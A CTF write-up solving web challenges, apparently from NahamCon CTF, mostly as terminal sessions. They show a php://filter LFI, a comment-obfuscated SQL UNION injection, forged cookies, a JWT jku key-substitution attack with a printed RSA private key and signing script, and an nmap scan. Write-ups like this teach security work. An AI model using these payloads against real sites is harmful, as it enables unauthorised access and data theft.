# Agent 95

You don't look like our agent!
We will only give our flag to our Agent 95! He is still running an old version of Windows...

```
╭─zoey@nomadic ~/nahamcon
╰─$ curl 'http://jh2i.com:50000/' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'DNT: 1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows 95; BCD2000)' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Accept-Language: en-US,en;q=0.9,la;q=0.8' \
  --compressed \
  --insecure
flag{user_agents_undercover}
<div style="text-align:center">
<br><br><br><br>
<b> NOT CHALLENGE RELATED:</b><br>THANK YOU to Digital Ocean for supporting NahamCon and NahamCon CTF!
<p>
<img width=600px src="https://d24wuq6o951i2g.cloudfront.net/img/events/id/457/457748121/assets/1b5a9739fd31b42fa4eb37ac6b3a6e1c.DOlogo.png">
</p>
</div>
```

# Localghost

Look in the source to see the jquery scroll javascript file. It's an obfuscated file. Use the console to print the variable defined at the start. In the array

```
4: ""
5: "flag"
6: "SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9"
7: "setItem"
8: "localStorage"
```

Base64 decode

```
╭─zoey@nomadic ~/nahamcon
╰─$ echo "SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9" | base64 -d
JCTF{spoooooky_ghosts_in_storage}
```

# phphonebook

Sorry! You are in /index.php/?file=
The phonebook is located at phphonebook.php

Do LFI to get the source, use the php:// filters

```
╭─zoey@nomadic ~/nahamcon
╰─$ curl 'http://jh2i.com:50002/?file=php://filter/convert.base64-encode/resource=phphonebook.php' \                                                                                          1 ↵
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'DNT: 1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Accept-Language: en-US,en;q=0.9,la;q=0.8' \
  -H 'Cookie: token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InNxY0UxYTlnajlwMDh6Tk1SMU1XYkxMdnVhUHlVZUpFc0NsQmh5N1E0SmMiLCJqa3UiOiJodHRwczovL3d3dy56b2V5aW50aGUuY2xvdWQvandrcy5qc29uIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.D1SvXaFg1XntRy5Jdl-HqVCZZNbExj6jT8rnYE6a_2S_T6pfQQ9Sv1yBdh9WIfeOoDIvMZ7QqxlZF5lVIdOjK9mnlVBgDMw5Mo0hLPam_coFxO5EUlYIxcbluTjDQV2ALLDqSuOHc7FtGQGxIh6duKYGenonMhZbtsiiXt4ZLt8MlWgmbEf_3E6mCEMxBUdFZXD9zayuB9-FkeW0I7yar5bUTx7CYE1_bcW7qLa922rjSaRAx3ixp5mJJOoZjSyOSrjeTp_yha-CWsLe72wA_29c9HjhpdjLxhQMjA1ZCNtp3v6jE4Mdcoq0yuh09INVG_1--aWqmhhYpoHEUqEh6A' \
  --compressed \
  --insecure
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Phphonebook</title>
    <link href="main.css" rel="stylesheet">
  </head>
  <body>
        PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5QaHBob25lYm9vazwvdGl0bGU+CiAgICA8bGluayBocmVmPSJtYWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICA8L2hlYWQ+CgogIDxib2R5IGNsYXNzPSJiZyI+CiAgICA8aDEgaWQ9ImhlYWRlciI+IFdlbGNvbWUgdG8gdGhlIFBocGhvbmVib29rIDwvaDE+CgogICAgPGRpdiBpZD0iaW1fY29udGFpbmVyIj4KCiAgICAgIDxpbWcgc3JjPSJib29rLmpwZyIgd2lkdGg9IjUwJSIgaGVpZ2h0PSIzMCUiLz4KCiAgICAgIDxwIGNsYXNzPSJkZXNjIj4KICAgICAgVGhpcyBwaHBob25lYm9vayB3YXMgbWFkZSB0byBsb29rIHVwIGFsbCBzb3J0cyBvZiBudW1iZXJzISBIYXZlIGZ1bi4uLgogICAgICA8L3A+CgogICAgPC9kaXY+Cjxicj4KPGJyPgogICAgPGRpdj4KICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249IiMiPgogICAgICAgIDxsYWJlbCBpZD0iZm9ybV9sYWJlbCI+RW50ZXIgbnVtYmVyOiA8L2xhYmVsPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJudW1iZXIiPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTdWJtaXQiPgogICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCiAgICA8ZGl2IGlkPSJwaHBfY29udGFpbmVyIj4KICAgIDw/cGhwCiAgICAgIGV4dHJhY3QoJF9QT1NUKTsKCiAgICAJaWYgKGlzc2V0KCRlbWVyZ2VuY3kpKXsKICAgIAkJZWNobyhmaWxlX2dldF9jb250ZW50cygiL2ZsYWcudHh0IikpOwogICAgCX0KICAgID8+CiAgPC9kaXY+CiAgPC9icj4KICA8L2JyPgogIDwvYnI+CgoKPGRpdiBzdHlsZT0icG9zaXRpb246Zml4ZWQ7IGJvdHRvbToxJTsgbGVmdDoxJTsiPgo8YnI+PGJyPjxicj48YnI+CjxiPiBOT1QgQ0hBTExFTkdFIFJFTEFURUQ6PC9iPjxicj5USEFOSyBZT1UgdG8gSU5USUdSSVRJIGZvciBzdXBwb3J0aW5nIE5haGFtQ29uIGFuZCBOYWhhbUNvbiBDVEYhCjxwPgo8aW1nIHdpZHRoPTYwMHB4IHNyYz0iaHR0cHM6Ly9kMjR3dXE2bzk1MWkyZy5jbG91ZGZyb250Lm5ldC9pbWcvZXZlbnRzL2lkLzQ1Ny80NTc3NDgxMjEvYXNzZXRzL2Y3ZGEwZDcxOGViNzdjODNmNWNiNjIyMWEwNmEyZjQ1LmludGkucG5nIj4KPC9wPgo8L2Rpdj4KCiAgPC9ib2R5Pgo8L2h0bWw+%
╭─zoey@nomadic ~/nahamcon
╰─$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5QaHBob25lYm9vazwvdGl0bGU+CiAgICA8bGluayBocmVmPSJtYWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICA8L2hlYWQ+CgogIDxib2R5IGNsYXNzPSJiZyI+CiAgICA8aDEgaWQ9ImhlYWRlciI+IFdlbGNvbWUgdG8gdGhlIFBocGhvbmVib29rIDwvaDE+CgogICAgPGRpdiBpZD0iaW1fY29udGFpbmVyIj4KCiAgICAgIDxpbWcgc3JjPSJib29rLmpwZyIgd2lkdGg9IjUwJSIgaGVpZ2h0PSIzMCUiLz4KCiAgICAgIDxwIGNsYXNzPSJkZXNjIj4KICAgICAgVGhpcyBwaHBob25lYm9vayB3YXMgbWFkZSB0byBsb29rIHVwIGFsbCBzb3J0cyBvZiBudW1iZXJzISBIYXZlIGZ1bi4uLgogICAgICA8L3A+CgogICAgPC9kaXY+Cjxicj4KPGJyPgogICAgPGRpdj4KICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249IiMiPgogICAgICAgIDxsYWJlbCBpZD0iZm9ybV9sYWJlbCI+RW50ZXIgbnVtYmVyOiA8L2xhYmVsPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJudW1iZXIiPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTdWJtaXQiPgogICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCiAgICA8ZGl2IGlkPSJwaHBfY29udGFpbmVyIj4KICAgIDw/cGhwCiAgICAgIGV4dHJhY3QoJF9QT1NUKTsKCiAgICAJaWYgKGlzc2V0KCRlbWVyZ2VuY3kpKXsKICAgIAkJZWNobyhmaWxlX2dldF9jb250ZW50cygiL2ZsYWcudHh0IikpOwogICAgCX0KICAgID8+CiAgPC9kaXY+CiAgPC9icj4KICA8L2JyPgogIDwvYnI+CgoKPGRpdiBzdHlsZT0icG9zaXRpb246Zml4ZWQ7IGJvdHRvbToxJTsgbGVmdDoxJTsiPgo8YnI+PGJyPjxicj48YnI+CjxiPiBOT1QgQ0hBTExFTkdFIFJFTEFURUQ6PC9iPjxicj5USEFOSyBZT1UgdG8gSU5USUdSSVRJIGZvciBzdXBwb3J0aW5nIE5haGFtQ29uIGFuZCBOYWhhbUNvbiBDVEYhCjxwPgo8aW1nIHdpZHRoPTYwMHB4IHNyYz0iaHR0cHM6Ly9kMjR3dXE2bzk1MWkyZy5jbG91ZGZyb250Lm5ldC9pbWcvZXZlbnRzL2lkLzQ1Ny80NTc3NDgxMjEvYXNzZXRzL2Y3ZGEwZDcxOGViNzdjODNmNWNiNjIyMWEwNmEyZjQ1LmludGkucG5nIj4KPC9wPgo8L2Rpdj4KCiAgPC9ib2R5Pgo8L2h0bWw+" | base64 -d
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Phphonebook</title>
    <link href="main.css" rel="stylesheet">
  </head>

  <body class="bg">
    <h1 id="header"> Welcome to the Phphonebook </h1>

    <div id="im_container">

      <img src="book.jpg" width="50%" height="30%"/>

      <p class="desc">
      This phphonebook was made to look up all sorts of numbers! Have fun...
      </p>

    </div>
<br>
<br>
    <div>
      <form method="POST" action="#">
        <label id="form_label">Enter number: </label>
        <input type="text" name="number">
        <input type="submit" value="Submit">
      </form>
    </div>

    <div id="php_container">
    <?php
      extract($_POST);

        if (isset($emergency)){
                echo(file_get_contents("/flag.txt"));
        }
    ?>
  </div>
  </br>
  </br>
  </br>


<div style="position:fixed; bottom:1%; left:1%;">
<br><br><br><br>
<b> NOT CHALLENGE RELATED:</b><br>THANK YOU to INTIGRITI for supporting NahamCon and NahamCon CTF!
<p>
<img width=600px src="https://d24wuq6o951i2g.cloudfront.net/img/events/id/457/457748121/assets/f7da0d718eb77c83f5cb6221a06a2f45.inti.png">
</p>
</div>

  </body>
</html>
```

Now we know to set the emergency param

```
╭─zoey@nomadic ~/nahamcon
╰─$  curl -k -X $'POST' \
    -H $'Host: jh2i.com:50002' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Referer: http://jh2i.com:50002/phphonebook.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 25' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    --data-binary $'number=911&emergency=true' \
    $'http://jh2i.com:50002/phphonebook.php' | grep flag
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1122  100  1097  100    25   5540    126 --:--:-- --:--:-- --:--:--  5638
    flag{phon3_numb3r_3xtr4ct3d}
```

# Extraterrestrial

XXE LFI /flag.txt

# Rejected Sequel

```
╭─zoey@nomadic ~/nahamcon
╰─$ curl --silent --data-urlencode 'name=X"/**/uNiOn/**/SeLECT/**/*/**/from/**/flag#' 'http://jh2i.com:50008/?debug=true' | sed -n '/<pre>/,/<\/pre>/p;/<\/pre>/q'
<pre>
Movies returned are:

flag{at_least_this_sequel_got_published}

<!-- if ( isset($_GET["debug"])){ echo($sql_query); } -->
X"/**/uNiOn/**/SeLECT/**/*/**/from/**/flag#</pre>
```

# Offical Business

In robots.txt

````python
#!/usr/bin/env python3

from flask import (
    Flask,
    render_template,
    request,
    abort,
    redirect,
    make_response,
    g,
    jsonify,
)
import binascii
import hashlib
import json

app = Flask(__name__)
app.secret_key = open("secret_key", "r").read().strip()
FLAG = open("flag.txt", "r").read().strip()


def do_login(user, password, admin):

    cookie = {"user": user, "password": password, "admin": admin}
    cookie["digest"] = hashlib.sha512(app.secret_key + bytes(json.dumps(cookie, sort_keys=True), "ascii")).hexdigest()

    response = make_response(redirect("/"))
    response.set_cookie("auth", binascii.hexlify(json.dumps(cookie).encode("utf8")))

    return response


@app.route("/login", methods=["POST"])
def login():

    user = request.form.get("user", "")
    password = request.form.get("password", "")

    if (
        user != "hacker"
        or hashlib.sha512(bytes(password, "ascii")).digest()
        != b"hackshackshackshackshackshackshackshackshackshackshackshackshack"
    ):
        return abort(403)
    return do_login(user, password, True)


def load_cookie():

    cookie = {}
    auth = request.cookies.get("auth")
    if auth:

        try:
            cookie = json.loads(binascii.unhexlify(auth).decode("utf8"))
            digest = cookie.pop("digest")

            if (
                digest
                != hashlib.sha512(
                    app.secret_key + bytes(json.dumps(cookie, sort_keys=True), "ascii")
                ).hexdigest()
            ):
                return False, {}
        except:
            pass


    return True, cookie


@app.route("/logout", methods=["GET"])
def logout():

    response = make_response(redirect("/"))
    response.set_cookie("auth", "", expires=0)
    return response


@app.route("/")
def index():

    ok, cookie = load_cookie()
    if not ok:
        return abort(403)

    return render_template(
        "index.html",
        user=cookie.get("user", None),
        admin=cookie.get("admin", None),
        flag=FLAG,
    )


@app.route("/robots.txt")
def source():
    return "
" + open(__file__).read() + "
"


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=1337)
    ```
````

Looks like if we can get it to load our cookie and then cause an exception we can get it to render the flag. Lets create some hex encoded json without
the digest property and try that.

```
╭─zoey@nomadic ~/nahamcon
╰─$ echo '{"user":"admin","admin":true}' | xxd -p                                                                            7b2275736572223a2261646d696e222c2261646d696e223a747275657d0a
╭─zoey@nomadic ~/nahamcon
╰─$ curl --silent 'http://jh2i.com:50006/' -H 'Cookie: auth=7b2275736572223a226861636b6572222c2261646d696e223a747275657d' | grep flag{
                                flag{did_this_even_pass_code_review}
```

# Seriously

```
MongoError: E11000 duplicate key error collection: shop.users index: username_1 dup key: { : "Thomas" }
```

```
/home/user/views/item.pug:15 13| .col-lg-9 14| .card.mt-4 > 15| img.card-img-top.img-fluid(src=`${item.image}` alt='') 16| .card-body 17| a.btn.btn-primary.float-right#add2Cart(href=`/add2cart?item=${item.name}`) Add to cart 18| h3.card-title #{item.name} Cannot read property 'image' of null
TypeError: /home/user/views/item.pug:15
    13|       .col-lg-9
    14|         .card.mt-4
  > 15|           img.card-img-top.img-fluid(src=`${item.image}` alt='')
    16|           .card-body
    17|             a.btn.btn-primary.float-right#add2Cart(href=`/add2cart?item=${item.name}`) Add to cart
    18|             h3.card-title #{item.name}

Cannot read property 'image' of null
    at eval (eval at wrap (/home/user/node_modules/pug-runtime/wrap.js:6:10), <anonymous>:143:98)
    at template (eval at wrap (/home/user/node_modules/pug-runtime/wrap.js:6:10), <anonymous>:259:335)
    at Object.exports.renderFile (/home/user/node_modules/pug/lib/index.js:418:38)
    at Object.exports.renderFile (/home/user/node_modules/pug/lib/index.js:408:21)
    at View.exports.__express [as engine] (/home/user/node_modules/pug/lib/index.js:455:11)
    at View.render (/home/user/node_modules/express/lib/view.js:135:8)
    at tryRender (/home/user/node_modules/express/lib/application.js:640:10)
    at Function.render (/home/user/node_modules/express/lib/application.js:592:3)
    at ServerResponse.render (/home/user/node_modules/express/lib/response.js:1008:7)
    at /home/user/routes/index.js:64:9
```

# Jokes

Cookie is a JWT, and looking at one reveals

```shell-session
╭─zoey@nomadic ~/nahamcon
╰─$ cat private.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAu87+qUEs/TqBMPsa+2m0Kb/o1WX5R61G05aZ8jNyIySKkuVY
6GSDfR4kFGBIa8dIWg/n/sBL2gQDxQPpPcr+t8YVd3ky9IqDkY/ZKPk9eMd50vP8
Jj/Zq0HAhcPVO3abZRN0QkdtGz9iJt88Kz7PqFHXlCeCOQ7fnSbWpc8ZwLprwZpV
9GxRvxqXOw/RWShoIvPCgRv2APYjLf2AhZPD3uRLnTWXDjBmLz+DBJbAmJDEDEfz
sFWW86mCrYzc/nrtJ0RwBth5x80/POesmrA0vwh08ZJ1Y1LPkZiM5/RXlLgqewV/
uwTkmlXrQsdgRqdK6UM2AWuw/pTm9hHLkndmPwIDAQABAoIBADJMbcfGvNXVJWSI
2+EZnjbQPvtoJCseLSnd270SKi9fSf2tjvIueUi5GdCbOMokxSvZtrhzp9zr1lad
hYoXI8D0PCuTOiJkNnh1niNrHRuL0QS+c3mLADDtmzI4EJOsYFHhs/FMT9xMTW07
vFGYsOTThnkXW7kMUrcz/6jIno0O6j/zyPAvipFSA9d0rKWLDDDSDiefUAgSw3gR
2b8iJzc2P7/496HS0KItzE8ZD9g0ymmNYFK1c+D+osiMJBCneopy2VhmrObQo8tj
zzAeYTHmO6nWqtqB0EVmOn8RTV7PPBDf07ShrRkd73ykSBy269lKwBCaBVEokOGF
9FM/HYECgYEA9Qs8cyr2nyZapqF4pC2+0sw5Dw7TNvbb+cPAe4FlEZ26c6KaAVs7
zD5nuRZRblt1NT3QlznLDhyOD4IcIAXX4UaqPR9lLNbbghOmwthVribEEo1Ky5Ob
zhslckbOLJto4vr83JQX5lkpQCzYqDktC+J9nHG2iOy76L9D/hwBIgsCgYEAxDSl
Kl8n1Ke8IXfcqLQNJWJsTkI/iI7YaxDIT62qDZi2OiJixDbjEC7wx+AwzPgyn2ZF
vnl9mntbzZwrtkAcdzJRVYLezctomYOwEsYfdzBP2s5tKpxsZ83dwLUL2Yc+jUY4
LT0ETehV2SMt5CTT92F0QLey+EzrZiWrLfDtgR0CgYA6vWzKNrxTvj/wvbhLsuOR
aH8tCuK6xEZLAw+7C3OM24B8g7fjJ1mYRkVa6uyuRaI9FwpPlf0E7vdm5EuVqZDs
YaIhcMsyCncoIUnSX0V6r7REtjX9wu6QY5WAZVS7AK4N6xh+T8nC4BCxX464FKyl
sq9ltySIgicxTdggq9nhrQKBgD6kgEcy8kiW9R3KYw0Jz1isP+AMjrROxxIH3axy
yeRlaWjOKbJzw7MbCY0HKw2GAMObp5DUwSFdWUYgImShu3Ti/8zJZ9FUrCS3QrP7
xXgMWLKHTZtZLdNGixJHu2zMHVCFptHqtUEaeK5G6RP6HiLRXoh7HgzgoheO10Rn
s6yRAoGAccJHglOarl1qlqIpEnt8pF8E5icO+VSevg+BpSa5KSmzfbkzDbGmPxUn
UNVuLKnwfIqLWTDRxX6heB5757ppeov/AUTArdzsxQInJDfH4cuANZRMiD3iN8RH
3+YFo8FI0+O8jHlXvjqZ507ULgdvVVki+BOqRWa6WGUydlBwMCE=
-----END RSA PRIVATE KEY-----
╭─zoey@nomadic ~/nahamcon
╰─$ cat convert-pem-to-jwk.js
var fs = require("fs");
var rsaPemToJwk = require("rsa-pem-to-jwk");

var pem = fs.readFileSync("private.pem");

var jwk = rsaPemToJwk(pem, { use: "sig" }, "public");

console.log(JSON.stringify({ keys: [jwk] }, null, 2));
╭─zoey@nomadic ~/nahamcon
╰─$ node convert-pem-to-jwk.js
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "n": "ALvO_qlBLP06gTD7GvtptCm_6NVl-UetRtOWmfIzciMkipLlWOhkg30eJBRgSGvHSFoP5_7AS9oEA8UD6T3K_rfGFXd5MvSKg5GP2Sj5PXjHedLz_CY_2atBwIXD1Tt2m2UTdEJHbRs_YibfPCs-z6hR15QngjkO350m1qXPGcC6a8GaVfRsUb8alzsP0VkoaCLzwoEb9gD2Iy39gIWTw97kS501lw4wZi8_gwSWwJiQxAxH87BVlvOpgq2M3P567SdEcAbYecfNPzznrJqwNL8IdPGSdWNSz5GYjOf0V5S4KnsFf7sE5JpV60LHYEanSulDNgFrsP6U5vYRy5J3Zj8",
      "e": "AQAB"
    }
  ]
}
╭─zoey@nomadic ~/nahamcon
╰─$ curl https://www.zoeyinthe.cloud/jwks.json
{
  "keys": [
    {
      "e": "AQAB",
      "kid": "sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc",
      "kty": "RSA",
      "n": "ALvO_qlBLP06gTD7GvtptCm_6NVl-UetRtOWmfIzciMkipLlWOhkg30eJBRgSGvHSFoP5_7AS9oEA8UD6T3K_rfGFXd5MvSKg5GP2Sj5PXjHedLz_CY_2atBwIXD1Tt2m2UTdEJHbRs_YibfPCs-z6hR15QngjkO350m1qXPGcC6a8GaVfRsUb8alzsP0VkoaCLzwoEb9gD2Iy39gIWTw97kS501lw4wZi8_gwSWwJiQxAxH87BVlvOpgq2M3P567SdEcAbYecfNPzznrJqwNL8IdPGSdWNSz5GYjOf0V5S4KnsFf7sE5JpV60LHYEanSulDNgFrsP6U5vYRy5J3Zj8"
    }
  ]
}
╭─zoey@nomadic ~/nahamcon
╰─$ cat flag-jokes-jwt-gen.js
var jwt = require("jsonwebtoken");
var fs = require("fs");
var privateKey = fs.readFileSync("private.pem");

var token = jwt.sign({ user: "admin" }, privateKey, {
  algorithm: "RS256",
  header: {
    alg: "RS256",
    jku: "https://www.zoeyinthe.cloud/jwks.json",
    kid: "sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc",
  },
  noTimestamp: true,
});

console.log(token);

var jwksClient = require("jwks-rsa");
var client = jwksClient({
  jwksUri: "https://www.zoeyinthe.cloud/jwks.json",
});
function getKey(header, callback) {
  client.getSigningKey(header.kid, function (err, key) {
    var signingKey = key.publicKey || key.rsaPublicKey;
    callback(null, signingKey);
  });
}

jwt.verify(token, getKey, {}, function (err, decoded) {
  if (err) {
    console.error(err);
  }
  console.log(decoded);
});
╭─zoey@nomadic ~/nahamcon
╰─$ node flag-jokes-jwt-gen.js
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InNxY0UxYTlnajlwMDh6Tk1SMU1XYkxMdnVhUHlVZUpFc0NsQmh5N1E0SmMiLCJqa3UiOiJodHRwczovL3d3dy56b2V5aW50aGUuY2xvdWQvandrcy5qc29uIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.D1SvXaFg1XntRy5Jdl-HqVCZZNbExj6jT8rnYE6a_2S_T6pfQQ9Sv1yBdh9WIfeOoDIvMZ7QqxlZF5lVIdOjK9mnlVBgDMw5Mo0hLPam_coFxO5EUlYIxcbluTjDQV2ALLDqSuOHc7FtGQGxIh6duKYGenonMhZbtsiiXt4ZLt8MlWgmbEf_3E6mCEMxBUdFZXD9zayuB9-FkeW0I7yar5bUTx7CYE1_bcW7qLa922rjSaRAx3ixp5mJJOoZjSyOSrjeTp_yha-CWsLe72wA_29c9HjhpdjLxhQMjA1ZCNtp3v6jE4Mdcoq0yuh09INVG_1--aWqmhhYpoHEUqEh6A
{ username: 'admin' }
╭─zoey@nomadic ~/nahamcon
╰─$ curl 'http://jh2i.com:50010/' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  -H 'DNT: 1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Referer: http://jh2i.com:50010/login' \
  -H 'Accept-Language: en-US,en;q=0.9,la;q=0.8' \
  -H 'Cookie: token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InNxY0UxYTlnajlwMDh6Tk1SMU1XYkxMdnVhUHlVZUpFc0NsQmh5N1E0SmMiLCJqa3UiOiJodHRwczovL3d3dy56b2V5aW50aGUuY2xvdWQvandrcy5qc29uIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.D1SvXaFg1XntRy5Jdl-HqVCZZNbExj6jT8rnYE6a_2S_T6pfQQ9Sv1yBdh9WIfeOoDIvMZ7QqxlZF5lVIdOjK9mnlVBgDMw5Mo0hLPam_coFxO5EUlYIxcbluTjDQV2ALLDqSuOHc7FtGQGxIh6duKYGenonMhZbtsiiXt4ZLt8MlWgmbEf_3E6mCEMxBUdFZXD9zayuB9-FkeW0I7yar5bUTx7CYE1_bcW7qLa922rjSaRAx3ixp5mJJOoZjSyOSrjeTp_yha-CWsLe72wA_29c9HjhpdjLxhQMjA1ZCNtp3v6jE4Mdcoq0yuh09INVG_1--aWqmhhYpoHEUqEh6A' \
  --compressed \
  --insecure | grep flag
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   955  100   955    0     0   1801      0 --:--:-- --:--:-- --:--:--  1798
                    <p class="card-text">Congratulations here is your flag!</p>
                        flag{whoops_typo_shoulda_been_flag_jwks} your request. Either the server is overloaded or there is an error in the application.</p>
```

# Trash the Cache

```
─zoey@nomadic ~/nahamcon
╰─$ nmap -T4 -A -v -p- hackbookagram.com
80/tcp    open     http       nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to https://hackbookagram.com/
443/tcp   open     ssl/http   nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Hackbookagram | login
| ssl-cert: Subject: commonName=hackbookagram.com
| Subject Alternative Name: DNS:hackbookagram.com, DNS:www.hackbookagram.com
| Issuer: commonName=Let's Encrypt Authority X3/organizationName=Let's Encrypt/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-06-05T19:31:50
| Not valid after:  2020-09-03T19:31:50
| MD5:   354c 1d71 89d2 c271 4a11 c420 e3af 8ee4
|_SHA-1: 5dee 3158 a7b7 c565 92bf 7199 fe21 cc8b ed16 1ba0
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
11211/tcp filtered memcache
14151/tcp filtered unknown
25093/tcp filtered unknown
27077/tcp filtered unknown
50055/tcp open     http-proxy HAProxy http proxy 1.3.1 or later
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; Device: load balancer; CPE: cpe:/o:linux:linux_kernel
```
